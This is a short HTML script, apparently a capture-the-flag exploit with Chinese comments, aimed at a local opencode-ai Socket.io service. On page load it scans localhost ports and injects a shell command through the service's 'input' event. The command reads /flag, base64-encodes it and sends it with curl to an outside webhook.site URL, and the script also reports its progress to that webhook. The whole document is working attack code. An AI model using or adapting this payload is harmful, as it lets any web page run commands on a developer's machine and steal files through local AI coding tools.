<script>
    const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";

    async function exploit(port) {
        return new Promise((resolve) => {
            // Socket.io 的默认路径
            const ws = new WebSocket(`ws://127.0.0.1:${port}/socket.io/?EIO=4&transport=websocket`);
            
            ws.onopen = () => {
                // 1. 发送 Socket.io 连接包
                ws.send('40'); 
                
                // 2. 发送 Shell 命令
                // 先改权限，再读 flag，最后发给 webhook
                const cmd = `chmod 444 /flag && curl ${WEBHOOK}/$(cat /flag | base64)`;
                
                // Socket.io 的消息格式通常是 42["event", "data"]
                // opencode-ai 1.2.x 监听的是 'input' 事件
                ws.send(`42["input", "${cmd}\\n"]`);
                
                fetch(`${WEBHOOK}?status=success_port_${port}`);
                resolve(true);
            };

            ws.onerror = () => resolve(false);
            
            // 3秒超时
            setTimeout(() => { ws.close(); resolve(false); }, 3000);
        });
    }

    async function start() {
        fetch(`${WEBHOOK}?status=scanning`);
        // 优先尝试 4096，如果不成功再扫别的
        if (await exploit(4096)) return;
        
        for (let p = 3000; p <= 3005; p++) {
            await exploit(p);
        }
    }

    start();
</script>
